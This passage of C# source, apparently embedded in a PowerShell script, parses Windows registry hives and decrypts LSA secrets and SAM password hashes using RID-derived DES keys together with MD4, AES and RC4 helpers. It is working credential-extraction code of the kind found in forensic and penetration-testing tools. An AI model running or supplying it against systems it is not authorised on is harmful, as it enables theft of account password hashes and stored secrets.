                        throw new Exception("Bad LF/LH record at: " + hive.BaseStream.Position);

                    ParseChildNodes(hive);

                    hive.BaseStream.Position = pos + 4; //go to next record list
                }
            }
            //lf or lh
            else if (buf[0] == 0x6c && (buf[1] == 0x66 || buf[1] == 0x68))
                ParseChildNodes(hive);
            else
                throw new Exception("Bad LF/LH/RI Record at: " + hive.BaseStream.Position);
        }
    }

    private void ParseChildNodes(BinaryReader hive)
    {
        int count = hive.ReadInt16();
        long topOfList = hive.BaseStream.Position;

        for (int i = 0; i < count; i++)
        {
            hive.BaseStream.Position = topOfList + (i * 8);
            int newoffset = hive.ReadInt32();
            hive.BaseStream.Position += 4;
            //byte[] check = hive.ReadBytes(4);
            hive.BaseStream.Position = 4096 + newoffset + 4;
            NodeKey nk = new NodeKey(hive) { ParentNodeKey = this };
            this.ChildNodes.Add(nk);
        }

        hive.BaseStream.Position = topOfList + (count * 8);
    }

    private void ReadChildValues(BinaryReader hive)
    {
        this.ChildValues = new List<ValueKey>();
        if (this.ValueListOffset != -1)
        {
            hive.BaseStream.Position = 4096 + this.ValueListOffset + 4;

            for (int i = 0; i < this.ValuesCount; i++)
            {
                hive.BaseStream.Position = 4096 + this.ValueListOffset + 4 + (i * 4);
                int offset = hive.ReadInt32();
                hive.BaseStream.Position = 4096 + offset + 4;
                this.ChildValues.Add(new ValueKey(hive));
            }
        }
    }

    public byte[] getChildValues(string valueName)
    {
        ValueKey targetData = this.ChildValues.Find(x => x.Name.Contains(valueName));
        return targetData.Data;
    }
}

public class ValueKey
{
    public ValueKey(BinaryReader hive)
    {
        byte[] buf = hive.ReadBytes(2);

        if (buf[0] != 0x76 && buf[1] != 0x6b)
            throw new NotSupportedException("Bad vk header");

        this.NameLength = hive.ReadInt16();
        this.DataLength = hive.ReadInt32();

        byte[] databuf = hive.ReadBytes(4);

        this.ValueType = hive.ReadInt32();
        hive.BaseStream.Position += 4;

        buf = hive.ReadBytes(this.NameLength);
        this.Name = (this.NameLength == 0) ? "Default" : System.Text.Encoding.UTF8.GetString(buf);

        if (this.DataLength < 5)
            this.Data = databuf;
        else
        {
            hive.BaseStream.Position = 4096 + BitConverter.ToInt32(databuf, 0) + 4;
            this.Data = hive.ReadBytes(this.DataLength);
        }
    }

    public short NameLength { get; set; }
    public int DataLength { get; set; }
    public int DataOffset { get; set; }
    public int ValueType { get; set; }
    public string Name { get; set; }
    public byte[] Data { get; set; }
    public string String { get; set; }
}

internal class LsaSecret
{
    public LsaSecret(byte[] inputData)
    {
        version = inputData.Take(4).ToArray();
        enc_key_id = inputData.Skip(4).Take(16).ToArray();
        enc_algo = inputData.Skip(20).Take(4).ToArray();
        flags = inputData.Skip(24).Take(4).ToArray();
        data = inputData.Skip(28).ToArray();
    }

    public byte[] version { get; set; }
    public byte[] enc_key_id { get; set; }
    public byte[] enc_algo { get; set; }
    public byte[] flags { get; set; }
    public byte[] data { get; set; }
}

internal class LsaSecretBlob
{
    public LsaSecretBlob(byte[] inputData)
    {
        length = BitConverter.ToInt16(inputData.Take(4).ToArray(), 0);
        unk = inputData.Skip(4).Take(12).ToArray();
        secret = inputData.Skip(16).Take(length).ToArray();
    }

    public int length { get; set; }
    public byte[] unk { get; set; }
    public byte[] secret { get; set; }
}

internal static class Crypto
{
    //https://rosettacode.org/wiki/MD4
    public static byte[] Md4Hash2(this byte[] input)
    {
        // get padded uints from bytes
        List<byte> bytes = input.ToList();
        uint bitCount = (uint)(bytes.Count) * 8;
        bytes.Add(128);
        while (bytes.Count % 64 != 56) bytes.Add(0);
        var uints = new List<uint>();
        for (int i = 0; i + 3 < bytes.Count; i += 4)
            uints.Add(bytes[i] | (uint)bytes[i + 1] << 8 | (uint)bytes[i + 2] << 16 | (uint)bytes[i + 3] << 24);
        uints.Add(bitCount);
        uints.Add(0);

        // run rounds
        uint a = 0x67452301, b = 0xefcdab89, c = 0x98badcfe, d = 0x10325476;
        Func<uint, uint, uint> rol = (x, y) => x << (int)y | x >> 32 - (int)y;
        for (int q = 0; q + 15 < uints.Count; q += 16)
        {
            var chunk = uints.GetRange(q, 16);
            uint aa = a, bb = b, cc = c, dd = d;
            Action<Func<uint, uint, uint, uint>, uint[]> round = (f, y) =>
            {
                foreach (uint i in new[] { y[0], y[1], y[2], y[3] })
                {
                    a = rol(a + f(b, c, d) + chunk[(int)(i + y[4])] + y[12], y[8]);
                    d = rol(d + f(a, b, c) + chunk[(int)(i + y[5])] + y[12], y[9]);
                    c = rol(c + f(d, a, b) + chunk[(int)(i + y[6])] + y[12], y[10]);
                    b = rol(b + f(c, d, a) + chunk[(int)(i + y[7])] + y[12], y[11]);
                }
            };
            round((x, y, z) => (x & y) | (~x & z), new uint[] { 0, 4, 8, 12, 0, 1, 2, 3, 3, 7, 11, 19, 0 });
            round((x, y, z) => (x & y) | (x & z) | (y & z), new uint[] { 0, 1, 2, 3, 0, 4, 8, 12, 3, 5, 9, 13, 0x5a827999 });
            round((x, y, z) => x ^ y ^ z, new uint[] { 0, 2, 1, 3, 0, 8, 4, 12, 3, 9, 11, 15, 0x6ed9eba1 });
            a += aa; b += bb; c += cc; d += dd;
        }
        // return hex encoded string
        byte[] outBytes = new[] { a, b, c, d }.SelectMany(BitConverter.GetBytes).ToArray();
        return outBytes;
    }

    //https://stackoverflow.com/questions/28613831/encrypt-decrypt-querystring-values-using-aes-256
    public static byte[] DecryptAES_ECB(byte[] value, byte[] key)
    {
        AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
        aes.BlockSize = 128;
        aes.Key = key;
        aes.Mode = CipherMode.ECB;
        aes.Padding = PaddingMode.None;
        using (ICryptoTransform decrypt = aes.CreateDecryptor())
        {
            byte[] dest = decrypt.TransformFinalBlock(value, 0, value.Length);
            return dest;
        }
    }

    public static byte[] DecryptAES_CBC(byte[] value, byte[] key, byte[] iv)
    {
        AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
        aes.BlockSize = 128;
        aes.Key = key;
        aes.Mode = CipherMode.CBC;
        aes.IV = iv;
        //you would think this would work to pad out the rest of the final block to 16, but it doesnt? ¯\_(ツ)_/¯
        aes.Padding = PaddingMode.Zeros;

        int tailLength = value.Length % 16;
        if (tailLength != 0)
        {
            List<byte> manualPadding = new List<byte>();
            for (int i = 16 - tailLength; i > 0; i--)
            {
                manualPadding.Add(0x00);
            }
            byte[] concat = new byte[value.Length + manualPadding.Count];
            System.Buffer.BlockCopy(value, 0, concat, 0, value.Length);
            System.Buffer.BlockCopy(manualPadding.ToArray(), 0, concat, value.Length, manualPadding.Count);
            value = concat;
        }

        using (ICryptoTransform decrypt = aes.CreateDecryptor())
        {
            byte[] dest = decrypt.TransformFinalBlock(value, 0, value.Length);
            return dest;
        }
    }

    public static byte[] ComputeSha256(byte[] key, byte[] value)
    {
        MemoryStream memStream = new MemoryStream();
        memStream.Write(key, 0, key.Length);
        for (int i = 0; i < 1000; i++)
        {
            memStream.Write(value, 0, 32);
        }
        byte[] shaBase = memStream.ToArray();
        using (SHA256 sha256Hash = SHA256.Create())
        {
            byte[] newSha = sha256Hash.ComputeHash(shaBase);
            return newSha;
        }
    }

    //https://stackoverflow.com/questions/7217627/is-there-anything-wrong-with-this-rc4-encryption-code-in-c-sharp
    public static byte[] RC4Encrypt(byte[] pwd, byte[] data)
    {
        int a, i, j, k, tmp;
        int[] key, box;
        byte[] cipher;

        key = new int[256];
        box = new int[256];
        cipher = new byte[data.Length];

        for (i = 0; i < 256; i++)
        {
            key[i] = pwd[i % pwd.Length];
            box[i] = i;
        }
        for (j = i = 0; i < 256; i++)
        {
            j = (j + box[i] + key[i]) % 256;
            tmp = box[i];
            box[i] = box[j];
            box[j] = tmp;
        }
        for (a = j = i = 0; i < data.Length; i++)
        {
            a++;
            a %= 256;
            j += box[a];
            j %= 256;
            tmp = box[a];
            box[a] = box[j];
            box[j] = tmp;
            k = box[((box[a] + box[j]) % 256)];
            cipher[i] = (byte)(data[i] ^ k);
        }
        return cipher;
    }

    //method from SidToKey - https://github.com/woanware/ForensicUserInfo/blob/master/Source/SamParser.cs
    private static void RidToKey(string hexRid, ref List<byte> key1, ref List<byte> key2)
    {
        int rid = Int32.Parse(hexRid, System.Globalization.NumberStyles.HexNumber);
        List<byte> temp1 = new List<byte>();

        byte temp = (byte)(rid & 0xFF);
        temp1.Add(temp);

        temp = (byte)(((rid >> 8) & 0xFF));
        temp1.Add(temp);

        temp = (byte)(((rid >> 16) & 0xFF));
        temp1.Add(temp);

        temp = (byte)(((rid >> 24) & 0xFF));
        temp1.Add(temp);

        temp1.Add(temp1[0]);
        temp1.Add(temp1[1]);
        temp1.Add(temp1[2]);

        List<byte> temp2 = new List<byte>();
        temp2.Add(temp1[3]);
        temp2.Add(temp1[0]);
        temp2.Add(temp1[1]);
        temp2.Add(temp1[2]);

        temp2.Add(temp2[0]);
        temp2.Add(temp2[1]);
        temp2.Add(temp2[2]);

        key1 = TransformKey(temp1);
        key2 = TransformKey(temp2);
    }

    private static List<byte> TransformKey(List<byte> inputData)
    {
        List<byte> data = new List<byte>();
        data.Add(Convert.ToByte(((inputData[0] >> 1) & 0x7f) << 1));
        data.Add(Convert.ToByte(((inputData[0] & 0x01) << 6 | ((inputData[1] >> 2) & 0x3f)) << 1));
        data.Add(Convert.ToByte(((inputData[1] & 0x03) << 5 | ((inputData[2] >> 3) & 0x1f)) << 1));
        data.Add(Convert.ToByte(((inputData[2] & 0x07) << 4 | ((inputData[3] >> 4) & 0x0f)) << 1));
        data.Add(Convert.ToByte(((inputData[3] & 0x0f) << 3 | ((inputData[4] >> 5) & 0x07)) << 1));
        data.Add(Convert.ToByte(((inputData[4] & 0x1f) << 2 | ((inputData[5] >> 6) & 0x03)) << 1));
        data.Add(Convert.ToByte(((inputData[5] & 0x3f) << 1 | ((inputData[6] >> 7) & 0x01)) << 1));
        data.Add(Convert.ToByte((inputData[6] & 0x7f) << 1));
        return data;
    }

    //from https://github.com/woanware/ForensicUserInfo/blob/master/Source/SamParser.cs
    private static byte[] DeObfuscateHashPart(byte[] obfuscatedHash, List<byte> key)
    {
        DESCryptoServiceProvider cryptoProvider = new DESCryptoServiceProvider();
        cryptoProvider.Padding = PaddingMode.None;
        cryptoProvider.Mode = CipherMode.ECB;
        ICryptoTransform transform = cryptoProvider.CreateDecryptor(key.ToArray(), new byte[] { 0, 0, 0, 0, 0, 0, 0, 0 });
        MemoryStream memoryStream = new MemoryStream(obfuscatedHash);
        CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
        byte[] plainTextBytes = new byte[obfuscatedHash.Length];
        int decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
        return plainTextBytes;
    }

    public static string DecryptSingleHash(byte[] obfuscatedHash, string user)
    {
        List<byte> key1 = new List<byte>();
        List<byte> key2 = new List<byte>();

        RidToKey(user, ref key1, ref key2);

        byte[] hashBytes1 = new byte[8];
        byte[] hashBytes2 = new byte[8];
        Buffer.BlockCopy(obfuscatedHash, 0, hashBytes1, 0, 8);
        Buffer.BlockCopy(obfuscatedHash, 8, hashBytes2, 0, 8);

        byte[] plain1 = DeObfuscateHashPart(hashBytes1, key1);
        byte[] plain2 = DeObfuscateHashPart(hashBytes2, key2);

        return (BitConverter.ToString(plain1) + BitConverter.ToString(plain2));
    }
}
'@
